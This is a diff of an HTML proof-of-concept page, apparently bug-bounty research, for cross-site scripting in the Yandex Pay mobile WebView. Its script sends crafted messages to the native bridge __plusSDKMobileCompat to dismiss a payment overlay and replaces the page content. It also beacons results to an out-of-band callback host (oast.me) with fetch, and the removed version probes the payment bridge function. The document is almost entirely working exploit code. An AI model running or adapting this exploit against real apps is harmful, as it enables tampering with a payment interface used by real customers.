@@ -1,61 +1,26 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// CONFIRMED: __plusSDKMobileCompat.onMessage() sends to native via
-// webkit.messageHandlers.__plusSDKMobileCompat_onMessage.postMessage(data)
-//
-// The READY message type from Android code: @SerialName("READY") with trackId field
-// Let's try various formats
+// SmartWebView expects READY_FOR_MESSAGES (not READY)
+// Format: {"type": "READY_FOR_MESSAGES", "trackId": "uuid"}
 
-var attempts = [
+var messages = [
+  '{"type":"READY_FOR_MESSAGES","trackId":"12345678-1234-1234-1234-123456789abc"}',
+  '{"type":"READY_FOR_MESSAGES"}',
   '{"type":"READY","trackId":"12345678-1234-1234-1234-123456789abc"}',
-  '{"type":"READY"}',
-  '{"type":"ready","trackId":"12345678-1234-1234-1234-123456789abc"}',
-  '{"type":"READY_FOR_MESSAGING","trackId":"12345678-1234-1234-1234-123456789abc"}',
-  '{"type":"PAGE_READY"}',
-  '{"type":"SDK_READY"}',
-  '{"event":"READY"}',
-  '{"action":"READY"}',
-  '{"message":"READY","trackId":"12345678-1234-1234-1234-123456789abc"}',
-  'READY',
 ];
 
-var results = [];
-
-attempts.forEach(function(msg, i) {
-  try {
-    window.__plusSDKMobileCompat.onMessage(msg);
-    results.push(i + ":sent:" + msg.substring(0,30));
-  } catch(e) {
-    results.push(i + ":err:" + e.message);
-  }
+messages.forEach(function(msg) {
+  try { window.__plusSDKMobileCompat.onMessage(msg); } catch(e){}
 });
 
-// Also try calling the handler directly
-try {
-  window.webkit.messageHandlers.__plusSDKMobileCompat_onMessage.postMessage('{"type":"READY","trackId":"test123"}');
-  results.push("direct:sent");
-} catch(e) {
-  results.push("direct:err:" + e.message);
-}
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ready-for-messages-sent?ok=1");
 
-// Check if there's also a __webviewPaymentWidget equivalent
-try {
-  var payStr = window.__webviewPaymentWidget.onEvent.toString();
-  results.push("payBridge:" + payStr.substring(0,150));
-} catch(e) {
-  results.push("payBridge:err:" + e.message);
-}
-
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ready-attempts?" + encodeURIComponent(JSON.stringify(results)));
-
-// Wait and check if overlay dismissed
 setTimeout(function(){
-  // Try to render content - if visible, overlay is gone
   document.body.style.background = '#111';
-  document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:-apple-system;color:#fff;min-height:100vh;"><h1 style="color:#fc0;">XSS in Yandex Pay</h1><p>If you can see this, the overlay was dismissed.</p><p>r4dl3 PoC</p></div>';
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/content-rendered?visible=check");
-}, 3000);
+  document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:-apple-system;color:#fff;min-height:100vh;display:flex;flex-direction:column;justify-content:center;"><h1 style="color:#fc0;">XSS in Yandex Pay</h1><p>r4dl3 PoC - If you see this, overlay dismissed</p></div>';
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/overlay-dismissed?visible=true");
+}, 2000);
 </script>
 </body>
 </html>
